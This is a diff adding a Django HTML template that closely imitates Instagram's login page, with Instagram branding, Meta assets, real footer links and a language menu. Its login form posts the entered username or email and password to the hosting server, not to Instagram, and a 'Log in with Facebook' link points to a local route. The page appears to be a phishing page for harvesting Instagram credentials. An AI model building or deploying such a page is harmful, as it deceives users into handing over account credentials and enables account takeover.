@@ -1,0 +1,168 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Instagram </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
+        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="{% static "../static/css/insta.css" %}">
+    <link rel="stylesheet" href="{% static "../static/css/theme.css" %}">
+    <link rel="stylesheet" href="{% static "../static/css/bootstrap.min.css"%}">
+    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico" rel="shortcut icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico">
+</head>
+<body>
+
+    <div id="container">
+        <section>
+            <div class="main-top">
+                <div class="logo">
+                    <img src="{% static "../static/img/logo.png" %}" />
+                </div>
+                <div>
+                    <form method="POST">
+                        {% csrf_token %}
+                    <input name="email" type="text" placeholder="Phone number, username, or email" class="username" required/>
+                    <div>
+                        <input name="password" type="password" placeholder="password" class="password" required/>
+                    </div>
+                    <button type="submit" class="login-btn fw-bold" style="font-size:13px;">Log in</button>
+                </form>
+                </div>
+
+                <span class="or"> 
+                    <hr> 
+                    <span class="height:10px;">OR</span> 
+                    <hr>  
+                </span>
+
+                <br> <br>
+
+
+                <div class="main-bottom">
+                    <a style="color:#385185; font-size:13px" href="{% url "facebook" %}" class="logInFB fw-bold">
+                        <i class="fa-brands fa-square-facebook"></i>
+                        Log in with Facebook </a><br>
+                    <a style="color:#385185; font-size:11px" href="https://www.instagram.com/accounts/password/reset/" class="forget"> Forgot password?</a>
+                </div>
+
+            </div>
+            <div class="bottom">
+                <div class="signUp">
+                    <span style="font-size:13px">Don't have an account?</span> 
+                    <a style="font-size:13px" class="fw-bold" style="color: rgba(0,149,246,1)" href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+                </div>
+            </div>
+
+
+
+            <div class="app-section">
+                <span style="font-size:13px"> Get the app. </span>
+                <div class="images">
+
+                    <a target="_blank" href="https://apps.apple.com/us/app/instagram/id389801252?ct=igweb.loginPage.badge&mt=8&pt=428156&vt=lo">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Download on the App Store">
+                    </a>
+                    
+                    <a target="_blank" href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en&gl=US">
+                    <img src="{% static "../static/img/googlePlay.png" %}" alt="googlePlay Image">
+                    </a>
+                    
+                </div>
+            </div>
+
+            <img class="mx-auto text-center d-flex justify-content-center" alt="from Meta" width="52" height="27" src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg">
+
+
+
+        </section>
+
+        <!-- Footer Section Starts from Here -->
+        <footer>
+            <a href="https://about.meta.com/">Meta</a>
+            <a href="https://about.instagram.com/">About</a>
+            <a href="https://about.instagram.com/blog/">Blog</a>
+            <a href="https://about.instagram.com/about-us/careers">Jobs</a>
+            <a href="https://help.instagram.com/">Help</a>
+            <a href="https://developers.facebook.com/docs/instagram">API</a>
+            <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a>
+            <a href="https://help.instagram.com/581066165581870/">Terms</a>
+            <a href="https://www.instagram.com/explore/locations/">Locations</a>
+            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+            <a href="https://www.threads.net/login">Threads</a>
+            <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
+            <a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a>
+
+            <div class="bottom-footer">
+                <select aria-label="Switch Display Language" class="bg-transparent" style="width:60px;">
+                    <option value="af">Afrikaans</option>
+                    <option value="ar">العربية</option>
+                    <option value="cs">Čeština</option>
+                    <option value="da">Dansk</option>
+                    <option value="de">Deutsch</option>
+                    <option value="el">Ελληνικά</option>
+                    <option value="en" selected>English</option>
+                    <option value="en-gb">English (UK)</option>
+                    <option value="es">Español (España)</option>
+                    <option value="es-la">Español</option>
+                    <option value="fa">فارسی</option>
+                    <option value="fi">Suomi</option>
+                    <option value="fr">Français</option>
+                    <option value="he">עברית</option>
+                    <option value="id">Bahasa Indonesia</option>
+                    <option value="it">Italiano</option>
+                    <option value="ja">日本語</option>
+                    <option value="ko">한국어</option>
+                    <option value="ms">Bahasa Melayu</option>
+                    <option value="nb">Norsk</option>
+                    <option value="nl">Nederlands</option>
+                    <option value="pl">Polski</option>
+                    <option value="pt-br">Português (Brasil)</option>
+                    <option value="pt">Português (Portugal)</option>
+                    <option value="ru">Русский</option>
+                    <option value="sv">Svenska</option>
+                    <option value="th">ภาษาไทย</option>
+                    <option value="tl">Filipino</option>
+                    <option value="tr">Türkçe</option>
+                    <option value="zh-cn">中文(简体)</option>
+                    <option value="zh-tw">中文(台灣)</option>
+                    <option value="bn">বাংলা</option>
+                    <option value="gu">ગુજરાતી</option>
+                    <option value="hi">हिन्दी</option>
+                    <option value="hr">Hrvatski</option>
+                    <option value="hu">Magyar</option>
+                    <option value="kn">ಕನ್ನಡ</option>
+                    <option value="ml">മലയാളം</option>
+                    <option value="mr">मराठी</option>
+                    <option value="ne">नेपाली</option>
+                    <option value="pa">ਪੰਜਾਬੀ</option>
+                    <option value="si">සිංහල</option>
+                    <option value="sk">Slovenčina</option>
+                    <option value="ta">தமிழ்</option>
+                    <option value="te">తెలుగు</option>
+                    <option value="ur">اردو</option>
+                    <option value="vi">Tiếng Việt</option>
+                    <option value="zh-hk">中文(香港)</option>
+                    <option value="bg">Български</option>
+                    <option value="fr-ca">Français (Canada)</option>
+                    <option value="ro">Română</option>
+                    <option value="sr">Српски</option>
+                    <option value="uk">Українська</option></select>
+
+                <span> &copy; 2024 Instagram from Meta</span>
+            </div>
+
+        </footer>
+    </div>
+    
+
+    <script src="{% static "../static/js/theme.js" %}"></script>
+    <script src="{% static "../static/js/bootstrap.min.js" %}"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+</body>
+</html>
